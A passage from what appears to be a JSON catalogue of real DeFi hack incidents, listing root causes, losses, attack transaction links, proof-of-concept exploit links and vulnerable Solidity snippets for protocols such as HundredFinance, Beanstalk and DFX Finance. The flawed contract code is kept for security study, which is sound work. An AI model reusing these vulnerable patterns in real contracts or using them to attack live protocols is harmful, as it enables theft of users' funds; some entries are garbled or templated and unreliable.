ourselves.\n\n    // A Solidity high level call has three parts:\n    //  1. The target address is checked to verify it contains contract code\n    //  2. The call itself is made, and success asserted\n    //  3. The return value is decoded, which in turn checks the size of the returned data.\n    // solhint-disable-next-line max-line-length\n    require(Utils.isContract(address(token)), \"SafeERC20: call to non-contract\");\n\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, bytes memory returndata) = address(token).call(data);\n    require(success, \"SafeERC20: low-level call failed\");\n\n    if (returndata.length > 0) { // Return data is optional\n        // solhint-disable-next-line max-line-length\n        require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n    }\n}",
        "analysis": "**safeTransferFrom() in SafeToken.sol** does not revert when the token EOA. \ntokenAddress can be address(0) to pass all check to mint xETH."
    },
    {
        "type": "Donate, Math, Under/Overflow",
        "date": "20230415",
        "lost": "$7M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/HundredFinance_2_exp.sol",
        "title": "HundredFinance",
        "root_cause": "cToken.redeem() is rounded down - first deposit bug",
        "attack_tx": "https://optimistic.etherscan.io/tx/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451",
        "analysis": [
            "https://twitter.com/peckshield/status/1647307128267476992",
            "https://twitter.com/danielvf/status/1647329491788677121",
            "https://twitter.com/hexagate_/status/1647334970258608131",
            "https://blog.hundred.finance/15-04-23-hundred-finance-hack-post-mortem-d895b618cf33"
        ],
        "vulnerable_code_snippet": "function redeemFresh(address redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint) {\n\t...\n\telse\n\t\t(vars.mathErr, vars.redeemTokens) = divScalarByExpTruncate(redeemAmountIn, Exp(vars.exchangeRateMantissa));  // rounded down from 1.9999 -> 1 (should be rounded up to 2)\n\n\tuint256 allowed = comptroller.redeemAllowed(address(this), redeemer, vars.redeemTokens);\n}"

    },
    {
        "type": "Price Manipulation",
        "date": "20230711",
        "title": "RodeoFinance",
        "root_cause": "The root cause is the Protocol utilized the faulty price oracle for LP pricing, so the attacker can use Sandwich attack to manipulate the price. And the Investor.earn() routine has a flaw that can be forced to swap `$USDC` -> `$WETH` -> `$unshETH`, so attacker can bypass slippage control.",
        "attack_tx": "https://arbiscan.io/tx/0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/RodeoFinance_exp.sol",
        "analysis": [
            "https://twitter.com/Phalcon_xyz/status/1678765773396008967",
            "https://twitter.com/peckshield/status/1678700465587130368",
            "https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101"
        ],
        "Lost": "$888k"

    },
    {
        "type": "Business Logic Flaw",
        "date": "20230513",
        "title": "Bitpaidio",
        "lost": "$30K",
        "root_cause": "Lock_Token() did not properly update the lock times.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Bitpaidio_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x1ae499ccf292a2ee5e550702b81a4a7f65cd03af2c604e2d401d52786f459ba6",
        "analysis": "https://twitter.com/BlockSecTeam/status/1657411284076478465",
        "vulnerable_code_snippet": "if (sixMonth[msg.sender].reinvest == 0) {\n    uint256 startTime = block.timestamp;\n    uint256 endTime = block.timestamp + 180 days;\n    sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender, total, startTime, endTime, 1);\n} else {\n    uint256 startTime = sixMonth[msg.sender].start_time;\n    uint256 endTime = sixMonth[msg.sender].end_time;\n    sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender, total, startTime, endTime, 1);\n}"
    },
    {
        "attackType": "Flash Loan Attack",
        "description": "An attacker exploited a vulnerability in the token's `transfer` function. The attack involved borrowing a large amount of tokens via a flash loan, manipulating the contract state to transfer more tokens than allowed, and then repaying the loan with the stolen tokens.",
        "vulnerability": "Insufficient checks on token amounts during transfers.",
        "impact": "The attacker was able to steal a significant amount of tokens from the contract.",
        "mitigation": "Implement robust checks on token amounts during transfers, ensuring that the transferred amount does not exceed the available balance or any predefined limits. Consider using an external oracle for price-based calculations and implement safeguards against reentrancy attacks."
    },
    {
        "type": "ERC20, Flashloans",
        "date": "20221006",
        "lost": "$290K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221006-RES-Token---pair-manipulate",
        "title": "RES token",
        "root_cause": "thisAToB(), burn RES token to increase exchange ratio. Attacker did multiple swaps to get rewards ALL token and burn RES token to increase exchange ratio.",
        "attack_tx": null,
        "analysis": "Attacker did multiple swaps to get rewards ALL token and burn RES token to increase exchange ratio.",
        "vulnerable_code": "https://www.bscscan.com/address/0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21#code#L683",
        "POC_link": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221006-RES-Token---pair-manipulate",
          "vulnerable_code_snippet": "function _transfer(address sender, address recipient, uint256 amount) internal {\n    require(!_blacklist[tx.origin], \"blacklist!\");\n    require(!isContract(recipient) || _whiteContract[recipient] || sender == owner() || recipient == owner(), \"no white contract\");\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\n    require(recipient != address(this), \"transfer fail\");\n    require(_allToken != address(0), \"no set allToken\");\n    if (sender != owner() && recipient != owner() && IPancakePair(_swapV2Pair).totalSupply() == 0) {\n        require(recipient != _swapV2Pair, \"no start\");\n    }\n    _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\n    \n    bool skip = _isSkip(sender, recipient);\n    TransferType transferType = _transferType(sender, recipient);\n    \n    uint256 amountRecipient = amount;\n    if (!_lockSwapFee && !skip && transferType != TransferType.TRANSFER) {\n        if (transferType == TransferType.SWAP_BUY) {\n            if (_isBuySwap(amount)) {\n                amountRecipient = amount.mul(uint256(100).sub(_buyFee)).div(100);\n                _distBuyFee(recipient, amount.mul(_buyFee).div(100)); //Get ALLtoken reward\n            }\n        } else if (transferType == TransferType.SWAP_SELL) {\n            if (_isSellSwap(amount)) {\n                amountRecipient = amount.mul(uint256(100).sub(_sellFee)).div(100);\n                _distSellFee(sender, amount.mul(_sellFee).div(100));\n            }\n        }\n    }\n    \n    if (transferType == TransferType.TRANSFER) {\n        _thisAToB(); //vulnerable point - burn RES\n    }\n}\n\nfunction _thisAToB() internal {\n    if (_balances[address(this)] > _minAToB) {\n        uint256 burnNumber = _balances[address(this)];\n        _approve(address(this), _pancakeRouterToken, _balances[address(this)]);\n        IPancakeRouter(_pancakeRouterToken).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            _balances[address(this)],\n            0,\n            _pathAToB,\n            address(this),\n            block.timestamp);\n        _burn(_swapV2Pair, burnNumber);  //vulnerable point\n        IPancakePair(_swapV2Pair).sync();\n    }\n}"
    },
    {
        "type": "Reentrancy",
        "date": "20240714",
        "title": "Minterest",
        "root_cause": "Attackers can lend tokens inside flashloan callbacks and then redeem more tokens after the flashloan.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/mantle/0xb3c4c313a8d3e2843c9e6e313b199d7339211cdc70c2eca9f4d88b1e155fd6bd",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Minterest_exp.sol",
        "analysis": "https://x.com/0xNickLFranklin/status/1813122959219040323",
        "lost": "$1.4M",
        "vulnerable_code_snippet": "function lendRUSDY(uint256 _rUsdyLendAmount) external override {\n    accrueInterest();\n    supervisor.beforelend(this, msg.sender);\n\n    // Verify market's block number equals current block number\n    require(accrualBlockNumber == getBlockNumber(), ErrorCodes.MARKET_NOT_FRESH);\n\n    // Order of actions here is crucial\n    // 1. Calculate exchange rate based on parameters before user's action\n    uint256 exchangeRateMantissa = exchangeRateStoredInternal();\n\n    // 2. Transfer USDY tokens from user\n    uint256 usdyLendAmount = unwrapTokens(_rUsdyLendAmount, msg.sender);\n\n    // 3. Calculate amount of MTokens to mint\n    uint256 lendTokens = (usdyLendAmount * EXP(1) / exchangeRateMantissa);\n\n    uint256 newTotalTokenSupply = totalTokenSupply;\n    totalTokenSupply = newTotalTokenSupply;\n    accountTokens[msg.sender] += lendTokens;\n\n    // ...\n}\n\nfunction flashLoan(\n    address token,\n    uint256 amount,\n    bytes calldata data\n) external nonReentrant returns (bool) {\n    require(token == address(underlying), ErrorCodes.FL_TOKEN_IS_NOT_UNDERLYING);\n    require(amount <= _maxFlashLoan(), ErrorCodes.FL_AMOUNT_IS_TOO_LARGE);\n\n    accrueInterest();\n\n    // Make supervisor checks\n    uint256 fee = _flashFee(amount);\n    supervisor.beforeFlashLoan(this, address(receiver), amount, fee);\n\n    // Transfer lend amount to receiver and call its callback\n    underlying.safeTransfer(address(receiver), amount);\n    require(\n        receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_LOAN_SUCCESS,\n        ErrorCodes.FL_CALLBACK_FAILED\n    );\n\n    // Transfer amount + fee back and check that everything was returned by token\n    uint256 actualPullAmount = doTransferIn(address(receiver), amount + fee);\n    require(actualPullAmount >= amount + fee, ErrorCodes.FL_PULL_AMOUNT_IS_TOO_LOW);\n\n    // Fee is recorded interest\n    totalProtocolFees += fee;\n    emit FlashLoanExecuted(address(receiver), fee);\n\n    return true;\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20230905",
        "title": "JumpFarm",
        "root_cause": "The problem originated from the `stake()` function in the FloorDAO contract. This function sends funds to the caller before triggering a rebase. As a result, instead of distributing an amount of sJUMP equal to the newly minted JUMP in the next rebase, it includes the user's stake. This causes a mismatch between the contract's JUMP balance and the circulating sJUMP. The attacker exploited this by repeatedly calling the `stake()` and `unstake()` functions within the same transaction.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x6189ad07894507d15c5dff83f547294e72f18561dc5662a8113f7eb932a5b079",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/JumpFarm_exp.sol",
        "analysis": "https://twitter.com/DecurityHQ/status/1699384904218202618",
        "vulnerable_code_snippet": "function stake(address _to, uint256 _amount) external {\n    rebase();\n    TOKEN.transferFrom(msg.sender, address(this), _amount);\n    sTOKEN.transfer(_to, _amount);\n}\n\nfunction rebase() public {\n    if (epoch.end <= block.timestamp) {\n        sTOKEN.rebase(epoch.distribute, epoch.number);\n\n        epoch.end = epoch.end + epoch.length;\n        epoch.number++;\n\n        if (address(distributor) != address(0)) {\n            distributor.distribute();\n        }\n\n        uint256 balance = TOKEN.balanceOf(address(this));\n        uint256 staked = sTOKEN.circulatingSupply();\n\n        if (balance <= staked) {\n            epoch.distribute = 0;\n        } else {\n            epoch.distribute = balance - staked;\n        }\n    }\n}\n\nfunction unstake(address _to, uint256 _amount, bool _rebase) external {\n    if (_rebase) rebase();\n    sTOKEN.transferFrom(msg.sender, address(this), _amount);\n    require(\n        _amount <= TOKEN.balanceOf(address(this)),\n        \"Insufficient TOKEN balance in contract\"\n    );\n    TOKEN.transfer(_to, _amount);\n}"
    },
    {
        "type": "Flashloans, Incorrect logic",
        "date": "20221110",
        "lost": "$4M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DFX_exp.sol",
        "title": "DFXFinance",
        "root_cause": "The victim contract uses contract balance for the repayment judgment. As a result, the attacker uses deposit() to bypass the flashloan repayment.",
        "attack_tx": "https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1590960299246780417",
            "https://twitter.com/BeosinAlert/status/1591012525914861570",
            "https://twitter.com/AnciliaInc/status/1590839104731684865",
            "https://twitter.com/peckshield/status/1590831589004816384"
        ],
        "vulnerable_code_snippet": "function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external transactable noDelegateCall isNotEmergency {\n        uint256 fee = curve.epsilon.mulu(1e18);\n        \n        require(IERC20(derivatives[0]).balanceOf(address(this)) > 0, 'Curve/token0-zero-liquidity-depth');\n        require(IERC20(derivatives[1]).balanceOf(address(this)) > 0, 'Curve/token1-zero-liquidity-depth');\n        \n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);\n        uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));\n        uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));\n\n        if (amount0 > 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);\n        if (amount1 > 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);\n\n        IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);\n\n        uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));\n        uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));\n\n        require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');\n        require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        IERC20(derivatives[0]).safeTransfer(owner, paid0);        \n        IERC20(derivatives[1]).safeTransfer(owner, paid1);        \n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }"
    },
    {
        "type": "Insufficient validation, Slippage",
        "date": "20231110",
        "title": "grok",
        "root_cause": "The protocol lost 26 ETH due to insufficient slippage control. The attacker exploited the `_transfer` function in the GROK contract to trigger `swapTokensForEth` when the balance surpassed `_taxSwapThreshold`, allowing them to harvest and convert extra GROK tokens into ETH. As shown in the Vulnerable Code Snippet section, there is no slippage check in the interaction with the Uniswap V2 router.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813?line=136",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/grok_exp.sol",
        "analysis": [
            "Root cause:",
            "Vulnerable code snippet:",
            "Attack tx:",
            "Analysis:"
        ],
        "vulnerable_code_snippet": "function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = uniswapV2Router.WETH();\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, // No Slippage Check\n        path,\n        address(this),\n        block.timestamp\n    );\n}"
    },
    {
        "type": null,
        "date": null,
        "title": "Root Cause Template",
        "root_cause": null,
        "attack_tx": null,
        "POC": null,
        "analysis": null
    },
    {
        "type": "DAO, Flashloans, MaliciousProposal, Stablecoin",
        "date": "20220416",
        "lost": "$182 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220416-beanstalkfarms---dao--flashloan",
        "title": "BeanstalkFarms",
        "fixed": "fixed",
        "root_cause": "insufficient validation. As the BIP18 proposal was created one day ago, validation one will be bypassed. By flashloan, the BIP18 proposal gained more than 78% of the vote, which is more than 67%. So proposal executed.",
        "analysis": "As the BIP18 proposal was created one day ago, validation one will be bypassed. By flashloan, the BIP18 proposal gained more than 78% of the vote, which is more than 67%. So proposal executed.",
        "vulnerable_code_snippet": "function emergencyCommit(uint32 bip) external {\n    require(isNominated(bip), \"Governance: Not nominated.\");\n    require(\n        block.timestamp >= timestamp(bip).add(C.getGovernanceEmergencyPeriod()),\n        \"Governance: Too early.\"\n    );\n    require(isActive(bip), \"Governance: Ended.\");\n    require(\n        bipVotePercent(bip).greaterThanOrEqualTo(C.getGovernanceEmergencyThreshold()),\n        \"Governance: Must have super majority.\"\n    );\n    _execute(msg.sender, bip, false, true);\n}"
    },
    {
        "type": "Rug-Pull(Protocol Side), Token-Transfer",
        "date": "20230119",
        "lost": "2000 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/ThoreumFinance_exp.sol",
        "title": "ThoreumFinance",
        "root_cause": "Ancilia: when 0x7d1e1901226e0ba389bfb1281ede859e6e48cc3d calls transfer to itself, its balance will increase. By repeating doing this, it ends with 500k+ $THOREUM tokens",
        "vulnerable_code": "https://bscscan.com/token/0xce1b3e5087e8215876af976032382dd338cf8401#code",
        "attack_tx": "https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51",
        "analysis": "https://twitter.com/AnciliaInc/status/1615944396134043648"
    },
    {
        "type": "ERC20, Governance, uninitialized",
        "date": "20220723",
        "lost": "$6M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220723-audius---storage-collision--malicious-proposal",
        "title": "Audius",
        "fixed": true,
        "root_cause": "Storage Collision & Malicious Proposal. AudiusAdminUpgradabilityProxy uses storage slot 0 for the address of the proxyAdmin. Re-define voting on the Audius protocol and modify the governance contract's guardian address via initialize().\n_votingPeriod to 3 blocks.\n_executionDelay to 0 block\n_guardianAddress",
        "vulnerable_code_snippet": "/**\n   * @dev Modifier to use in the initializer function of a contract.\n   */\n  modifier initializer() {\n    require(msg.sender == proxyAdmin, \"Only proxy admin can initialize\");\n    require(initializing || isConstructor() || !initialized, \"Contract instance has already been initialized\");\n\n    bool isTopLevelCall = !initializing;\n    if (isTopLevelCall) {\n      initializing = true;\n      initialized = true;\n    }\n\n    _;\n\n    if (isTopLevelCall) {\n      initializing = false;\n    }\n  }",
        "analysis": null,
        "attack_tx": null
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240705",
        "lost": "20K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Hackathon_exp.sol",
        "title": "Hackathon",
        "root_cause": "When every time skim is called, Hackathon will mint some token  to cake-LP",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0xea181f730886ece947e255ab508f5af1d0f569fee3368b651d5dbb28549087b5",
        "analysis": "https://x.com/EXVULSEC/status/1779519508375613827",
        "vulnerable_code_snippet": "function _transfer(address sender, address recipient, uint256 amount) internal {\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(recipient != address(0), \"BEP20: transfer to the zero address\");\n    _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\n    uint256 buyFeeAmount = amount * _buyFee / 10000;\n    uint256 sellFeeAmount = amount * _sellFee / 10000;\n    uint256 transFeeAmount = amount * _transFee / 10000;\n    address txOrg = tx.origin;\n    if (txOrg == devs || rewards[txOrg]) {\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        return;\n    }\n    if (pair[sender] || pair[recipient]) { // <-- vulnerable point\n        if (pair[sender]) {\n            // BUY\n            amount = amount.sub(buyFeeAmount);\n            _balances[dead] = _balances[dead].add(buyFeeAmount);\n            emit Transfer(sender, dead, buyFeeAmount);\n            _balances[recipient] = _balances[recipient].add(amount);\n            emit Transfer(sender, recipient, amount);\n        }\n        if (pair[recipient]) {\n            // SELL\n            _balances[dead] = _balances[dead].add(sellFeeAmount);\n            emit Transfer(sender, dead, sellFeeAmount);\n            _balances[recipient] = _balances[recipient].add(amount);\n            emit Transfer(sender, recipient, amount);\n        }\n    } else {\n        // Transfer\n        _balances[dead] = _balances[dead].add(transFeeAmount);\n        emit Transfer(sender, dead, transFeeAmount);\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n    return;\n}"
    },
    {
        "type": "ERC777, Insufficient validation",
        "date": "20220618",
        "lost": "104 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220618-snood---miscalculation-on-_spendallowance",
        "title": "SNOOD",
        "root_cause": "Miscalculation on _spendAllowance. Misuses `_getStandardAmount` and should be `_getReflectedAmount`",
        "vulnerable_code": "function _spendAllowance(address owner, address spender, uint256 amount) internal override { super._spendAllowance(owner, spender, _getStandardAmount(amount));\n //vulnerable point\n }"
    },
    {
        "type": "Access Control, Flashloans",
        "date": "20230601",
        "title": "DDCoin",
        "lost": "$300k",
        "root_cause": "Access Control",
        "attack_tx": "https://bscscan.com/tx/0xd92bf51b9bf464420e1261cfcd8b291ee05d5fbffbfbb316ec95131779f80809",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/DDCoin_exp.sol",
        "analysis": null,
        "vulnerable_code_snippet": "function listItem(uint256 _amount, address invite) external returns (uint256) {\n    require(_amount % amount_double_buy == 0 && _amount > 0 && _amount <= amount_max_buy, \"Illegal amount \");  \n    bool flag = (inviter[msg.sender] != address(0) || (invite != msg.sender && invite != address(0) && inviter[invite] != address(0)));\n    require(flag, \"The recommender does not exist\");\n    require(getOrderByDay() < amount_max_count_day, \"Only one order can be placed within hours\");\n    if (per_up_price == 0) {\n        addItem(_amount);\n    } else {\n        if (_amount + total_buy_coin - prev_up_amount < per_amount_price) {\n            addItem(_amount);\n        } else {\n            uint256 clac_amount = _amount;\n            while (clac_amount > 0) {\n                uint256 buy = prev_up_amount + per_amount_price - total_buy_coin;\n                if (buy > clac_amount) {\n                    addItem(clac_amount);\n                    break;\n                } else {\n                    addItem(buy);\n                    prev_up_amount += per_amount_price;\n                    new_price += per_up_price;\n                    clac_amount -= buy;\n                }   \n            }\n        }\n    }\n    if (inviter[msg.sender] == address(0)) {    \n        inviter[msg.sender] = invite;\n    }\n    caclInviteLimit(_amount * limit_scale / 100 - _amount);\n    usdt.transferFrom(msg.sender, address(this), _amount);\n    emit ItemListed(msg.sender, _amount, new_price / 100);\n    return total_buy_coin;\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20240325",
        "lost": "223K",
        "title": "ZongZi",
        "root_cause": "The Root cause is in `burnToHolder()`, it used `getAmountsOut()` to calculate exchange rate of `ZongZi` and `Bnb`. Attacker can  manipulated this rate by exchanging huge amount of `BnB` to `ZongZi`.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ZongZi_exp.sol",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/bsc/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f",
        "analysis": "https://twitter.com/0xNickLFranklin/status/1772195949638775262",
        "vulnerable_code_snippet": "function burnToHolder(uint256 amount, address _invitation) external {\n    require(amount >= 0, \"TeaFactory: insufficient funds\");\n\n    address sender = _msgSender();\n    if (Invitation;\n    path[0] = address(_burnToken);\n    path[1] = uniswapRouter.WETH();\n    uint256 deserved = 0;\n    deserved = uniswapRouter.getAmountsOut(amount, path)[path.length - 1];\n    require(payable(address(_burnToken)).balance >= deserved, 'not enough balance');\n    _burnToken.zongziToholder(sender, amount, deserved);\n    _BurnTokenToDead(sender, amount);\n    burnFeeRewards(sender, deserved);\n}"
    },
    {
        "type": "Precision, Price Manipulation",
        "date": "20231101",
        "title": "OnyxProtocol",
        "root_cause": "- When the pool is empty, the exchange rate could be manipulated through donation. Thus more assets could be borrowed out. There exists precision loss inside the function `redeemUnderlying`. Thus this could be exploited to redeem donated funds.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/OnyxProtocol_exp.sol",
        "analysis": [
            "https://twitter.com/Phalcon_xyz/status/1719697319824851051",
            "https://defimon.xyz/attack/mainnet/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635",
            "https://twitter.com/DecurityHQ/status/1719657969925677161",
            "https://hacken.io/discover/onyx-protocol-hack/"
        ],
        "Lost": "$2M"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230902",
        "title": "DAppSocial",
        "root_cause": "The withdrawTokensWithAlt() function determined the withdrawal amount by subtracting a user-controlled balance from the msg.sender's balance. This vulnerability allowed the attacker to manipulate the user-controlled balance and profit from the exploit.",
        "attack_tx": "https://etherscan.io/tx/0xbd72bccec6dd824f8cac5d9a3a2364794c9272d7f7348d074b580e3c6e44312e",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/DAppSocial_exp.sol",
        "analysis": "https://twitter.com/DecurityHQ/status/1698064511230464310",
        "lost": "$16K"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20231201",
        "lost": "$500k",
        "title": "UnverifiedContr_0x431abb",
        "root_cause": "The root cause is a logic flaw in reward calculation. The victim contract is unverified, and after decompilation by Blocksec team, we obtained the following results:\n\n![GARV53RbIAAhtbU.jpeg](Flash%20Loan%20630e8d019ad74da4bbe4be8c78bcd285/GARV53RbIAAhtbU.jpeg)\nv4 is the token amount to be distributed, which can be increased through a flash loan, reducing the token balance of v0.\n\nThe attacker first staked some tokens and executed a flash loan of BSC-USD from the pair, then claimed the reward within the flash loan callback. Since the BSC-USD amount in the pair decreases, the reward token amount is calculated incorrectly, allowing the attacker to take an excessive amount of tokens as a reward.\n\nVulnerable code snippet:\n[](https://bscscan.com/address/0x431abb27dab05f4e7cdeaa18390fe39364197500)",
        "attack_tx": [
            {
                "type": "Claim Transaction",
                "link": "https://bscscan.com/tx/0xbeea4ff215b15870e22ed0e4d36ccd595974ffd55c3d75dad2230196cc379a52"
            },
            {
                "type": "Stake Transaction",
                "link": ""
            }
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/UnverifiedContr_0x431abb_exp.sol",
        "analysis": "https://x.com/Phalcon_xyz/status/1730625352953901123"
    },
    {
        "type": "Access Control",
        "date": "20231112",
        "title": "MEVBot_0x8c2d",
        "root_cause": "Due to the Lack of Access Control, anyone could designate himself with the privileged role of the MEV bot. Thus the privileged operation could be performed to harvest the assets.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x3dcb26a1f49eb4d02ca29960b4833bfb2e83d7b5d9591aed1204168944c8c9b3",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/MEV_0x8c2d_exp.sol",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1723897569661657553",
        "lost": "$365K"
    },
    {
        "type": "Arbitrage",
        "date": "20230424",
        "title": "Axioma",
        "root_cause": "Presale is cheaper than PancakeSwap",
        "attack_tx": "https://bscscan.com/tx/0x05eabbb665a5b99490510d0b3f93565f394914294ab4d609895e525b43ff16f2",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Axioma_exp.sol",
        "vulnerable_code": "https://bscscan.com/address/0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3#code",
        "analysis": "https://twitter.com/HypernativeLabs/status/1650382589847302145",
        "lost": "21 WBNB",
        "vulnerable_code_snippet": "function buyToken() public payable {\n    uint256 bnbAmountToBuy = msg.value;\n\n    uint256 tokenAmount = bnbAmountToBuy.mul(rate).div(10**9);\n\n    require(token.balanceOf(address(this)) >= tokenAmount, \"INSUFFICIENT_BALANCE_IN_CONTRACT\");\n\n    payable(PresaleOwner).transfer(bnbAmountToBuy);\n\n    uint256 taxAmount = tokenAmount.mul(buyTax).div(100);\n    token.transfer(PresaleOwner, taxAmount);\n\n    (bool sent) = token.transfer(msg.sender, tokenAmount.sub(taxAmount));\n    require(sent, \"FAILED_TO_TRANSFER_TOKENS_TO_BUYER\");\n}"
    },
    {
        "type": "Precision",
        "date": "20231111",
        "title": "MahaLend",
        "root_cause": "This is a common vulnerability which also affects `RDNT` and other protocols, which involves precision expansion and rounding. The `rayDiv` function is known to have rounding issues, and the attacker could try to manipulate the input `b` to  to cause the rounded value to increase to a similar magnitude. In such case, during operations like withdrawing, the actual value would be much smaller than expected due to rounding issues.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/MahaLend_exp.sol",
        "analysis": [
            "https://x.com/Phalcon_xyz/status/1723223766350832071",
            "https://beosin.com/resources/how-radiant-capital-was-exploited-by-hackers-for-a-45-million\u00a0heist?lang=zh-HK"
        ],
        "lost": "$20 K",
        "vulnerable_code_snippet": "function rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    // to avoid overflow, a <= (type(uint256).max - halfB) / RAY\n    assembly {\n      if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) {\n        revert(0, 0)\n      }\n\n      c := div(add(mul(a, RAY), div(b, 2)), b)\n    }\n  }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230615",
        "lost": "$16k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CFC_exp.sol",
        "title": "CFC",
        "root_cause": "Attacker could initiate transferFrom from the DEX contract that allowed him to transfer users that gave an approval for that contract.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xa3c130ed8348919f73cbefce0f22d46fa381c8def93654e391ddc95553240c1e",
        "analysis": [
            "https://twitter.com/hexagate_/status/1669280632738906113",
            "https://x.com/Phalcon_xyz/status/1669262923758456833"
        ],
